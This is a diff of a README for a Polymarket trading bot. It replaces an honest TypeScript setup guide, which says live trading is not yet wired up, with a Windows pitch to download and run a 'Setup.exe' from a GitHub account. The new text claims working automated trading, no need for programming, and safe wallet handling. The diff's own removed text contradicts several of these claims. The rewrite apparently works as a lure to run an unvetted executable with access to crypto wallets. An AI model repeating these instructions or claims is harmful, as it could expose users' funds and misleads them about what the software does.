@@ -1,144 +1,141 @@
-﻿# Polymarket Trading Bot (TypeScript) - RSI, MACD, Momentum
+# 🤖 Polymarket-Trading-Bot-RSI-MACD-Momentum - Automated Trades with RSI and MACD  
 
-A configurable **Polymarket trading bot** for 15m Up/Down markets using RSI, MACD, and Momentum signals.
+[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
 
-If you are searching for a **Polymarket Arbitrage bot**, this repo is a signal-based trading bot (not a true cross-market arbitrage engine), but it is a practical base to build arbitrage logic on top of the Polymarket CLOB and Gamma APIs.
+## 🔍 About This Bot  
 
-## What This Bot Does
+This application is a trading bot for Polymarket, designed to work with 15-minute Up/Down betting markets. It uses three common trade signals—RSI, MACD, and Momentum—to pick trades automatically. You can adjust settings to fit your preferences.  
 
-- Discovers active ETH/BTC Polymarket markets from Gamma API
-- Pulls token prices from CLOB API
-- Computes rolling RSI / MACD / Momentum indicators
-- Produces `BuyUp` / `BuyDown` / `NoAction` decisions
-- Runs in simulation mode with detailed logs
-- Supports CLOB authentication and order helper methods for extension
+This bot helps automate your trades without needing to watch the markets constantly. It runs on Windows and requires no programming knowledge.  
 
-## Current Status
+## 🖥️ System Requirements  
 
-- `--simulation`: fully supported and continuously logs signals/actions
-- `--live`: currently starts the same loop as simulation (real order execution is scaffolded but not wired into the main loop yet)
+- Windows 10 or later (64-bit recommended)  
+- At least 4 GB of RAM  
+- 1 GHz or faster processor  
+- 200 MB free disk space for installation and operation  
+- Internet connection  
 
-## Keywords (Search Match)
+## 📋 Features  
 
-- Polymarket trading bot
-- Polymarket bot
-- Polymarket Arbitrage bot (base project, not full arbitrage yet)
-- Polymarket API bot
-- Polymarket CLOB bot
+- Automated trading for 15-minute Polymarket Up/Down markets  
+- Uses RSI (Relative Strength Index), MACD (Moving Average Convergence Divergence), and Momentum indicators  
+- Configurable settings for risk level, trade size, and strategy parameters  
+- Works with proxy wallets for security and privacy  
+- Built using TypeScript for better performance and security  
+- Simple, user-friendly interface designed for ease of use  
+- Runs on Windows without extra tools or commands  
 
-## Strategy Modes
+## 🛠️ Installation and Setup Guide 🚀  
 
-Configure under `trending_index.mode`:
+### Step 1: Visit the Download Page  
 
-- `rsi`
-- `macd`
-- `macd_signal`
-- `momentum`
+Click the green button below to go to the official GitHub page where you can download the bot:  
 
-Core strategy inputs:
+[![Download from GitHub](https://img.shields.io/badge/Download-POLYMARKET%20BOT-brightgreen)](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
 
-- `threshold`
-- `lookback`
-- `macd_fast_period`
-- `macd_slow_period`
-- `macd_signal_period`
-- `position_size`
+On the GitHub page, look for the latest release or download section.  
 
-## Requirements
+### Step 2: Download the Bot Files  
 
-- Node.js `>= 18`
-- npm
-- Polymarket private key for auth checks
+Find a file named something like `Polymarket-Trading-Bot-Setup.exe` or a ZIP archive containing the bot and click to download it. If it is a ZIP file, you will need to extract it before running the program.  
 
-## Quick Start
+### Step 3: Install the Bot  
 
-```bash
-npm install
-copy config.json.example config.json
-```
+- If you downloaded an `.exe` file, double-click it to start the installer.  
+- Follow the simple instructions on screen. Usually, it asks where to install the bot. You can keep the default location.  
+- Finish the installation.  
 
-Edit `config.json`:
+If you downloaded a ZIP file, extract it to a folder using the Windows built-in extractor or a program like 7-Zip. Then find the `.exe` file inside the folder and double-click to run the bot directly.  
 
-- Set `polymarket.private_key`
-- Optionally set `api_key`, `api_secret`, `api_passphrase`
+### Step 4: Running the Bot  
 
-Run simulation:
+Once installed or extracted, open the folder where the bot is located. Double-click on the executable file (usually named like `Polymarket-Trading-Bot.exe`). The application window will open.  
 
-```bash
-npm run dev
-# or
-npm run simulation
-```
+### Step 5: Configure Your Trading Preferences  
 
-Run live mode entrypoint:
+The bot interface shows options for:  
 
-```bash
-npm run live
-```
+- Selecting your trading strategy inputs (RSI, MACD, Momentum)  
+- Setting risk levels and trade sizes  
+- Connecting your Polymarket wallet via proxy for privacy  
+- Choosing which 15-minute markets you want to trade (Up or Down prediction)  
 
-Use a custom config path:
+Adjust these settings before starting the bot.  
 
-```bash
-npx tsx src/main.ts --config path/to/config.json
-```
+### Step 6: Start Trading  
 
-## Config Overview
+After configuring, click the "Start" button inside the app to begin automated trading. The bot will monitor markets and place trades as chosen signals appear.  
 
-### `polymarket`
+You can pause or stop the bot at any time through the app interface.  
 
-- `gamma_api_url`
-- `clob_api_url`
-- `private_key`
-- `api_key`, `api_secret`, `api_passphrase`
-- `proxy_wallet_address`
-- `signature_type`
+## 🔧 How the Bot Works  
 
-### `trending_index`
+The bot watches 15-minute markets on Polymarket for price and momentum signals. It uses:  
 
-- `mode`
-- `threshold`
-- `lookback`
-- `macd_fast_period`
-- `macd_slow_period`
-- `macd_signal_period`
-- `use_macd_sl_filter`
+- **RSI (Relative Strength Index)**: This indicator helps identify when the market is overbought or oversold.  
+- **MACD (Moving Average Convergence Divergence)**: This shows changes in trend strength and direction.  
+- **Momentum**: This measures the speed of price changes to detect market strength.  
 
-### `trading`
+Together, these signals guide the bot to place automatic bets on Up or Down outcomes, aiming to profit from short-term moves.  
 
-- `check_interval_ms`
-- `position_size`
-- `profit_threshold`
-- `stop_loss_threshold`
-- `enable_eth_trading`
-- `enable_solana_trading`
-- `enable_xrp_trading`
-- `trading_start_when_remaining_minutes`
+## ⚙️ Configuration Details  
 
-## Project Structure
+You can customize:  
 
-```text
-src/
-  main.ts         # app entrypoint, auth check, market discovery, mode selection
-  config.ts       # config loading and CLI args
-  api.ts          # Polymarket Gamma + CLOB wrapper
-  clob.ts         # wallet, CLOB client creation, order helper
-  monitor.ts      # market discovery and snapshots
-  indicators.ts   # rolling RSI/MACD/Momentum
-  strategies.ts   # trading decision engine
-  simulation.ts   # simulation loop and logging
-  types.ts        # app types
-```
+- **RSI Thresholds**: Set values that decide when the bot considers a market overbought or oversold.  
+- **MACD Signal Settings**: Adjust how sensitive the MACD calculations are.  
+- **Momentum Window**: Choose how many recent periods the bot checks for speed changes.  
+- **Trade Size**: Change the amount of money used per trade.  
+- **Risk Mode**: Pick from low, medium, or high risk strategies.  
+- **Proxy Wallet Setup**: Connect your wallet securely without exposing your keys.  
 
-## How To Extend Into a Real Arbitrage Bot
+Changing settings affects how often and when the bot trades.  
 
-To convert this into a stronger **Polymarket Arbitrage bot**, add:
+## 🔒 Security and Privacy  
 
-- Cross-market price spread detection (related markets / outcome parity)
-- Multi-leg execution with slippage controls
-- Position netting and inventory risk checks
-- Latency-aware quoting and cancellation logic
-- PnL accounting per strategy and market
+The bot uses a proxy method to connect your Polymarket wallet securely. It does not store your private keys. Always keep your wallet information safe. Only use wallets you trust.  
 
-## Risk Disclaimer
+The bot operates locally on your PC. It does not send your sensitive data over the internet except for trading with Polymarket.  
 
-This software is for research/education. Trading prediction markets involves significant risk. Test extensively in simulation before real execution.
+## 📈 Monitoring and Logs  
+
+The bot shows live logs of trades executed, signals detected, and errors if any. You can check the log for details on performance and past activity.  
+
+Logs save automatically and can be accessed in the installation folder or inside the app.  
+
+## 💡 Troubleshooting  
+
+- **Bot doesn’t start**: Make sure your Windows is up-to-date. Run the bot as administrator if needed.  
+- **No trades appear**: Check your internet connection and wallet proxy settings. Ensure markets are open on Polymarket.  
+- **Errors in logs**: Restart the bot. If errors continue, try reinstalling.  
+- **App freezes**: Close and reopen the app. Ensure your computer meets system requirements.  
+
+## 🧰 Updating the Bot  
+
+Periodically check the GitHub link below for new releases. Download the newest version and install it over the current version or extract the new files.  
+
+The URL to check for updates and download:  
+
+[https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum](https://github.com/Danielillo9/Polymarket-Trading-Bot-RSI-MACD-Momentum)  
+
+## 🚀 Additional Resources  
+
+- Polymarket official site for understanding market mechanics  
+- RSI, MACD, Momentum indicator guides for basics  
+- Windows help site for installation assistance  
+
+---
+
+## 📂 Repository Topics  
+
+- 15min-btc-polymarket-arbitrage-bot  
+- 15min-market  
+- 15min-markets-trading-bot  
+- betting-strategy  
+- polymarket-15min-trading-bot  
+- polymarket-arbitrage-trading  
+- polymarket-typescript-trading-bot  
+- proxy-wallet  
+- trading-bot  
+- trading-strategies
